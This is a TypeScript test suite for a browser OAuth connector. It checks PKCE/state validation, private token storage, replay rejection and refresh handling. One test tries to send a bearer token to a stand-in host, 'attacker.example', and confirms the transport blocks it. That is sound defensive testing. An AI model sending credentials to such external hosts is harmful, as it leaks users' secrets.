import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, readFile, rm, stat } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { createBrowserAuth, consumerFetch } from '../src/connectors/browser-auth.ts';

test('browser OAuth registers only on explicit sign-in, validates PKCE/state, persists private tokens and rejects replay', async t => {
  const dataDir = await mkdtemp(join(tmpdir(), 'perpetual-browser-auth-'));
  const calls: string[] = []; let port = 4317;
  const transport: typeof fetch = async (input, init) => {
    const url = new URL(String(input)); calls.push(url.pathname);
    const json = (value: unknown) => new Response(JSON.stringify(value), { headers: { 'content-type': 'application/json' } });
    if (url.pathname.startsWith('/.well-known/oauth-protected-resource')) return json({ resource: 'https://connect.composio.dev/mcp', authorization_servers: ['https://connect.composio.dev'] });
    if (url.pathname === '/.well-known/oauth-authorization-server') return json({ issuer: 'https://connect.composio.dev', authorization_endpoint: 'https://connect.composio.dev/oauth/authorize', token_endpoint: 'https://login.composio.dev/oauth2/token', registration_endpoint: 'https://login.composio.dev/oauth2/register', response_types_supported: ['code'], grant_types_supported: ['authorization_code', 'refresh_token'], code_challenge_methods_supported: ['S256'], token_endpoint_auth_methods_supported: ['none'] });
    if (url.pathname === '/oauth2/register') { const body: unknown = JSON.parse(String(init?.body)); assert.equal((body as { token_endpoint_auth_method: unknown }).token_endpoint_auth_method, 'none'); return json({ ...body as object, client_id: 'client-example' }); }
    if (url.pathname === '/oauth2/token') { const body = new URLSearchParams(String(init?.body)); assert.equal(body.get('grant_type'), 'authorization_code'); assert.equal(body.get('code'), 'fixture-code'); assert.ok(body.get('code_verifier')); return json({ access_token: 'private-fixture-token', refresh_token: 'private-refresh-token', token_type: 'Bearer', expires_in: 3600 }); }
    throw new Error('Unexpected OAuth request');
  };
  let auth = await createBrowserAuth({ dataDir, callbackUrl: () => `http://127.0.0.1:${port}/connectors/oauth/callback`, transport });
  t.after(async () => { await auth.close(); await rm(dataDir, { recursive: true, force: true }); });
  assert.equal(auth.authorized(), false); assert.equal(auth.pending(), undefined); assert.equal(calls.length, 0);
  const link = new URL(await auth.start('linear'));
  assert.equal(link.origin, 'https://connect.composio.dev'); assert.equal(link.searchParams.get('code_challenge_method'), 'S256');
  assert.equal(await auth.start('linear'), link.href); assert.equal(calls.filter(p => p === '/oauth2/register').length, 1);
  await assert.rejects(auth.complete({ state: 'x'.repeat(64), code: 'fixture-code' }), /does not match/);
  assert.equal(calls.filter(p => p === '/oauth2/token').length, 0);
  await auth.close(); auth = await createBrowserAuth({ dataDir, callbackUrl: () => `http://127.0.0.1:${port}/connectors/oauth/callback`, transport });
  assert.equal(auth.pending()?.redirectUrl, link.href); assert.equal(calls.filter(p => p === '/oauth2/register').length, 1);
  assert.equal(await auth.complete({ state: link.searchParams.get('state'), code: 'fixture-code' }), 'linear');
  assert.equal(auth.authorized(), true); assert.equal(await auth.token(), 'private-fixture-token'); assert.equal(auth.pending(), undefined);
  await assert.rejects(auth.complete({ state: link.searchParams.get('state'), code: 'fixture-code' }), /expired/);
  assert.equal(calls.filter(p => p === '/oauth2/token').length, 1);
  const file = join(dataDir, 'connectors/browser-auth.json'); assert.equal((await stat(file)).mode & 0o777, 0o600);
  assert.ok((await readFile(file, 'utf8')).includes('private-fixture-token'));
  port = 4318; const next = new URL(await auth.start('slack')); assert.equal(next.searchParams.get('redirect_uri'), 'http://127.0.0.1:4318/connectors/oauth/callback');
});

test('OAuth transport refuses external endpoints and redirects before sending credentials', async () => {
  let calls = 0; const transport = consumerFetch(async () => { calls++; return new Response('{}'); });
  await assert.rejects(transport('https://attacker.example/token', { headers: { Authorization: 'Bearer private-token' } }), /unsupported/);
  assert.equal(calls, 0);
  await transport('https://login.composio.dev/oauth2/token'); assert.equal(calls, 1);
});

test('cancelled consent and revoked refresh tokens require a new explicit sign-in, with no restart work', async t => {
  const { consumerFixture } = await import('./fixtures/consumer-oauth.ts');
  const dataDir = await mkdtemp(join(tmpdir(), 'perpetual-browser-recovery-')), f = consumerFixture();
  let refreshes = 0;
  const transport: typeof fetch = async (input, init) => {
    const url = new URL(String(input));
    if (url.pathname === '/oauth2/token') {
      if (new URLSearchParams(String(init?.body)).get('grant_type') === 'refresh_token') { refreshes++; return new Response(JSON.stringify({ error: 'invalid_grant', error_description: 'private_fixture_bearer' }), { status: 400, headers: { 'content-type': 'application/json' } }); }
      return new Response(JSON.stringify({ access_token: 'private_fixture_bearer', refresh_token: 'private_refresh', token_type: 'Bearer', expires_in: 1 }), { headers: { 'content-type': 'application/json' } });
    }
    return f.transport(input, init);
  };
  const options = { dataDir, callbackUrl: () => 'http://127.0.0.1:4317/connectors/oauth/callback', transport };
  let auth = await createBrowserAuth(options);
  t.after(async () => { await auth.close(); await rm(dataDir, { recursive: true, force: true }); });
  let link = new URL(await auth.start('gmail'));
  await assert.rejects(auth.complete({ state: link.searchParams.get('state'), error: 'access_denied' }), /cancelled/);
  assert.equal(auth.pending(), undefined); assert.equal(auth.authorized(), false); assert.equal(refreshes, 0);
  link = new URL(await auth.start('gmail')); await auth.complete({ state: link.searchParams.get('state'), code: 'fixture-code' });
  await assert.rejects(auth.token(), error => { assert.ok(error instanceof Error); assert.ok(!error.message.includes('private_fixture_bearer')); return true; });
  assert.equal(auth.authorized(), false); assert.equal(refreshes, 1);
  await auth.close(); auth = await createBrowserAuth(options); assert.equal(auth.authorized(), false); assert.equal(refreshes, 1);
  assert.equal(new URL(await auth.start('gmail')).origin, 'https://connect.composio.dev');
});

test('refresh retains an unrotated refresh credential without inventing a new token expiry', async t => {
  const { consumerFixture } = await import('./fixtures/consumer-oauth.ts');
  const dataDir = await mkdtemp(join(tmpdir(), 'perpetual-browser-refresh-')), f = consumerFixture();
  const transport: typeof fetch = async (input, init) => {
    if (new URL(String(input)).pathname !== '/oauth2/token') return f.transport(input, init);
    const refresh = new URLSearchParams(String(init?.body)).get('grant_type') === 'refresh_token';
    return new Response(JSON.stringify(refresh ? { access_token: 'new_private_token', token_type: 'Bearer' } : { access_token: 'old_private_token', refresh_token: 'retained_private_refresh', token_type: 'Bearer', expires_in: 1 }), { headers: { 'content-type': 'application/json' } });
  };
  const auth = await createBrowserAuth({ dataDir, callbackUrl: () => 'http://127.0.0.1:4317/connectors/oauth/callback', transport });
  t.after(async () => { await auth.close(); await rm(dataDir, { recursive: true, force: true }); });
  const link = new URL(await auth.start('linear')); await auth.complete({ state: link.searchParams.get('state'), code: 'fixture-code' });
  assert.equal(await auth.token(), 'new_private_token');
  const saved = JSON.parse(await readFile(join(dataDir, 'connectors/browser-auth.json'), 'utf8'));
  assert.equal(saved.tokens.refresh_token, 'retained_private_refresh'); assert.equal(saved.expiresAt, undefined);
});
